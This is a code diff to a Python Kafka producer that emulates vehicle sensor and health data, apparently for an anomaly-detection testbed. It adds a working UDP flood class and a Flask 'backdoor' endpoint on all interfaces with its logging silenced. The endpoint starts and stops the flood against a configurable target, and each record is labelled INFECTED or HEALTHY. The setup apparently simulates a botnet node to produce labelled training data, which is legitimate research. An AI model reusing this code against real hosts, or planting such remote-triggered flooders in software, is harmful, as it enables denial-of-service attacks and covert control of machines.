@@ -13,6 +13,98 @@ import argparse
 import signal
 from train_monitor import TrainMonitor
 import os
+import requests
+import subprocess
+from flask import Flask
+import socket
+
+
+class Attack:
+    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
+        """
+        Crea un attaccante UDP per eseguire un flood su un target.
+
+        Parametri:
+        - target_ip: IP di destinazione
+        - target_port: Porta di destinazione (default: 80)
+        - duration: Durata dell'attacco in secondi (default: 60)
+        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
+        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
+        """
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.duration = duration
+        self.packet_size = packet_size
+        self.delay = delay
+        
+
+
+    def attack_condition(self):
+        if self.duration == 0:
+            return self.alive
+        else:
+            return self.alive and (time.time() < self.end_time)
+
+
+    def start_attack(self):
+        """
+        Esegui un attacco UDP flood sul target specificato.
+        """
+        # Crea il socket UDP
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        # Crea dati casuali per il pacchetto
+        data = os.urandom(self.packet_size)
+        
+        packets_sent = 0
+        bytes_sent = 0
+        start_time = time.time()
+        self.end_time = start_time + self.duration
+
+        logger.info(f"[BOT] Starting UDP flood to {self.target_ip}:{self.target_port}")
+        if self.duration != 0:
+            logger.debug(f"[BOT] Test will run for {self.duration} seconds")
+        else:
+            logger.debug(f"[BOT] Attack will continue until stopped by user.")
+
+        logger.debug(f"[BOT] Packet size: {self.packet_size} bytes")
+
+        try:
+            self.alive = True
+            while self.attack_condition():
+                sock.sendto(data, (self.target_ip, self.target_port))
+                packets_sent += 1
+                bytes_sent += self.packet_size
+
+                # Stampa le statistiche ogni 10000 pacchetti
+                if packets_sent % 10000 == 0:
+                    elapsed = time.time() - start_time
+                    rate = packets_sent / elapsed if elapsed > 0 else 0
+                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
+                    logger.info(f"[BOT] Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
+
+                # Aggiungi un ritardo tra i pacchetti se specificato
+                if self.delay > 0:
+                    time.sleep(self.delay)
+
+        except Exception:
+            logger.debug("[BOT] Attack stopped unexpectedly!")
+
+        finally:
+            # Chiudi il socket
+            sock.close()
+
+            # Stampa le statistiche finali
+            elapsed = time.time() - start_time
+            rate = packets_sent / elapsed if elapsed > 0 else 0
+            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
+
+            logger.info("[BOT] Attack ended")
+            logger.debug(f"[BOT] Duration: {elapsed:.2f} seconds")
+            logger.debug(f"[BOT] Packets sent: {packets_sent}")
+            logger.debug(f"[BOT] Data sent: {bytes_sent/1000000:.2f} MB")
+            logger.debug(f"[BOT] Rate: {rate:.2f} packets per second")
+            logger.debug(f"[BOT] Throughput: {mbps:.2f} Mbps")
 
 
 # Create a lock object
@@ -38,6 +130,8 @@ with open('copula_normali.pkl', 'rb') as f:
 produced_records = 0
 produced_anomalies = 0
 produced_diagnostics = 0
+
+HOST_IP = os.getenv("HOST_IP")
 
 # load the probabilities of the classes:
 anomaly_probabilities = pd.read_csv('generators/anomaly_cluster_probabilities.csv')
@@ -124,7 +218,7 @@ def health_probes_thread(args):
 
 
 def thread_anomalie(args):
-    global produced_anomalies
+    global produced_anomalies, attack_lock
     logger.info(f"Starting thread for anomalies generation for vehicle: {VEHICLE_NAME}")
     media_durata_anomalie = args.mu_anomalies * args.alpha
     sigma_anomalie = 1 * args.beta
@@ -156,12 +250,20 @@ def thread_anomalie(args):
 
         synthetic_anomalie = synthetic_anomalie.round(2)
         synthetic_anomalie = synthetic_anomalie[all_columns]
-        # print(f"Nuova anomalia generata: {synthetic_anomalie}")
-        # Convert data to JSON and send it to Kafka
+        
         data_to_send = synthetic_anomalie.iloc[0].to_dict()
         data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
         data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
         data_to_send['cluster'] = str(cluster)
+
+        if mode == 'SW':
+            with attack_lock:
+                health_dict = train_monitor.probe_health()
+                attack_label = get_status_robust()
+                data_to_send.update(health_dict)
+                data_to_send['node_status'] = attack_label
+            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
+        
         produced_anomalies += 1
         produce_message(data_to_send, topic_name)
         if args.time_emulation:
@@ -181,7 +283,7 @@ def sample_normal_from_clusters():
 
 
 def thread_normali(args):
-    global produced_diagnostics
+    global produced_diagnostics, attack_lock
     logger.info(f"Starting thread for normal data generation for vehicle: {VEHICLE_NAME}")
     media_durata_normali = args.mu_normal * args.alpha
     sigma_normali = 1 * args.beta
@@ -219,10 +321,42 @@ def thread_normali(args):
         data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
         data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
         data_to_send['cluster'] = str(cluster)
+        
+        if mode == 'SW':
+            with attack_lock:
+                health_dict = train_monitor.probe_health()
+                attack_label = get_status_robust()
+                data_to_send.update(health_dict)
+                data_to_send['node_status'] = attack_label
+            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
+
         produce_message(data_to_send, topic_name)
         produced_diagnostics += 1
         if args.time_emulation:
             time.sleep(durata_normale[0])
+
+
+def get_status_from_manager(vehicle_name):
+    url = f"http://{HOST_IP}:{MANAGER_PORT}/vehicle-status"
+    data = {"vehicle_name": vehicle_name}
+    response = requests.post(url, json=data)
+    logger.debug(f"Vehicle-status Response Status Code: {response.status_code}")
+    logger.debug(f"Vehicle-status Response Body: {response.text}")
+    return response.text
+
+
+def get_status_locally():
+    pid_request_command = 'pgrep -f attack.py'
+    # issue command in this host
+    pid_result = subprocess.run(pid_request_command, shell=True, stdout=subprocess.PIPE)
+    if pid_result.returncode == 0:
+        return 'INFECTED'
+    else:
+        return 'HEALTHY'
+
+
+def get_status_robust():    
+    return 'INFECTED' if UNDER_ATTACK else 'HEALTHY'
 
 
 def adjust_probability(index, probability, main_classes, main_prob, low_prob):
@@ -293,10 +427,14 @@ def signal_handler(sig, frame):
     stop_threads = True
 
 
+def configure_no_proxy():
+    os.environ['no_proxy'] = os.environ.get('no_proxy', '') + f",{HOST_IP}"
+
+
 def main():
-    global VEHICLE_NAME, KAFKA_BROKER
+    global VEHICLE_NAME, MANAGER_PORT, UNDER_ATTACK, attack_lock
     global producer, logger, anomaly_generators, diagnostics_generators
-    global anomaly_thread, diagnostics_thread, stop_threads, train_monitor
+    global anomaly_thread, diagnostics_thread, stop_threads, train_monitor, mode
 
     parser = argparse.ArgumentParser(description='Kafka Producer for Synthetic Vehicle Data')
     parser.add_argument('--kafka_broker', type=str, default='kafka:9092', help='Kafka broker URL')
@@ -312,16 +450,33 @@ def main():
     parser.add_argument('--ping_host', type=str, default="www.google.com")
     parser.add_argument('--probe_frequency_seconds', type=float, default=2)
     parser.add_argument('--probe_metrics',  type=parse_str_list, default=['RTT', 'INBOUND', 'OUTBOUND', 'CPU', 'MEM'])
+    parser.add_argument('--mode', type=str, default='OF', help='If OF, then functional sensors are separated from health sensors. If SW, sensors are united.')
+    parser.add_argument('--manager_port', type=int, default=5000, help='Port of the train manager service')
+    parser.add_argument('--no_proxy_host', action='store_true', help='set the host ip among the no_proxy ips.')
+    parser.add_argument("--target_ip", type=str, default='172.18.0.4', help="Target IP address")
+    parser.add_argument("--target_port", type=int, default=80, help="Target port (default: 80)")
+    parser.add_argument("--duration", type=int, default=0, help="Duration of the attack in seconds (default: 60)")
+    parser.add_argument("--packet_size", type=int, default=1024, help="Size of each packet in bytes (default: 1024)")
+    parser.add_argument("--delay", type=float, default=0.001, help="Delay between packets in seconds (default: 0.001)")
+    parser.add_argument("--bot_port", type=int, default=5002, help="Backdoor port for attacks")
 
     args = parser.parse_args()
+
+    MANAGER_PORT = args.manager_port
+    UNDER_ATTACK = False
 
     VEHICLE_NAME = os.environ.get('VEHICLE_NAME')
     assert VEHICLE_NAME is not None, "VEHICLE_NAME environment variable must be set"
 
-    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=str(args.logging_level).upper())
-    logger = logging.getLogger(VEHICLE_NAME+'_'+'producer')
+    if args.no_proxy_host:
+        configure_no_proxy()
+
+    
+    logging.basicConfig(format='%(name)s-%(levelname)s-%(message)s', level=str(args.logging_level).upper())
+    logger = logging.getLogger(f'[{VEHICLE_NAME}_PROD]')
     args.logger = logger
     args.vehicle_name = VEHICLE_NAME
+    mode = args.mode
     
     conf_prod = {
         'bootstrap.servers': args.kafka_broker,
@@ -329,6 +484,15 @@ def main():
         'value.serializer': lambda x, ctx: json.dumps(x).encode('utf-8')
     }
     producer = SerializingProducer(conf_prod)
+
+    attack_lock = threading.Lock()
+    attack = Attack(
+        target_ip=args.target_ip,
+        target_port=args.target_port,
+        duration=args.duration,
+        packet_size=args.packet_size,
+        delay=args.delay
+    )
 
     logger.info(f"Setting up producing threads for vehicle: {VEHICLE_NAME}")
     vehicle_args=argparse.Namespace(
@@ -350,12 +514,54 @@ def main():
     train_monitor_thread = threading.Thread(target=health_probes_thread, args=(args,))
     anomaly_thread = threading.Thread(target=thread_anomalie, args=(vehicle_args,))
     diagnostics_thread = threading.Thread(target=thread_normali, args=(vehicle_args,))
-
+    attack_thread = None
     # Set daemon to True
     anomaly_thread.daemon = True
     diagnostics_thread.daemon = True
     train_monitor_thread.daemon = True
+    
 
+
+    app = Flask(f'{VEHICLE_NAME}_backdoor')
+    @app.route('/start-attack', methods=['POST'])
+    def start_attack():
+        global UNDER_ATTACK, attack_thread
+        
+        with attack_lock:
+            if not UNDER_ATTACK:
+                attack_thread = threading.Thread(target=attack.start_attack)
+                attack_thread.daemon = True
+                attack_thread.start()
+                UNDER_ATTACK = True
+                train_monitor.reset()
+                return 'Attack launched', 200
+            else:
+                return 'Aleady under attack!!', 400
+    
+
+    @app.route('/stop-attack', methods=['POST'])
+    def stop_attack():
+        global UNDER_ATTACK, attack_thread
+        with attack_lock:
+            if UNDER_ATTACK:
+                attack.alive = False
+                attack_thread.join(1)
+                UNDER_ATTACK = False
+                train_monitor.reset()
+                return 'Attack stopped', 200
+            else:
+                return 'Wasn\'t under attack!!', 400
+    
+
+    flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': args.bot_port})
+    flask_thread.daemon = True
+    flask_thread.start()
+    logger.info(f"Backdoor installed at {args.bot_port}")
+    flask_logger = logging.getLogger('werkzeug')
+    flask_logger.name = f"[{VEHICLE_NAME}_BOT]"
+    def custom_handle(record):
+        return
+    flask_logger.handle = custom_handle
 
     # Start threads
     logger.info(f"Starting threads...")
@@ -363,14 +569,18 @@ def main():
     stop_threads = False
     anomaly_thread.start()
     diagnostics_thread.start()
-    train_monitor_thread.start()
+    if mode == 'OF': train_monitor_thread.start()
     
     while not stop_threads:
         time.sleep(0.1)
     logger.info(f"Stopping producing threads...")
     anomaly_thread.join(1)
     diagnostics_thread.join(1)
-    train_monitor_thread.join(1)
+    with attack_lock:
+        if UNDER_ATTACK:
+            attack.alive = False
+            attack_thread.join(1)
+    if mode == 'OF': train_monitor_thread.join(1)
     logger.info(f"Stopped producing threads.")
 
 
